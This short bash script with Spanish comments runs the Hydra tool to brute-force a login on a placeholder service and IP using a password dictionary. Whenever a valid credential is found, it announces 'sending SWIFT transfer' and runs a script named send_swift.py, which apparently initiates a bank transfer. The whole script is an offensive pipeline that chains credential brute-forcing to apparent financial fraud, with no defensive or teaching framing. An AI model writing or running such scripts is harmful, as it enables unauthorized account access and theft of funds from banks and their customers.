#!/bin/bash

# Ejecutar Hydra
hydra -l usuario -P diccionario.txt servicio://ip -o credenciales_validas.txt

# Verificar si Hydra encontró credenciales válidas
if grep -q "login:" credenciales_validas.txt; then
    echo "Conexión exitosa. Enviando transferencia SWIFT..."
    python3 send_swift.py
else
    echo "No se encontraron credenciales válidas."
fi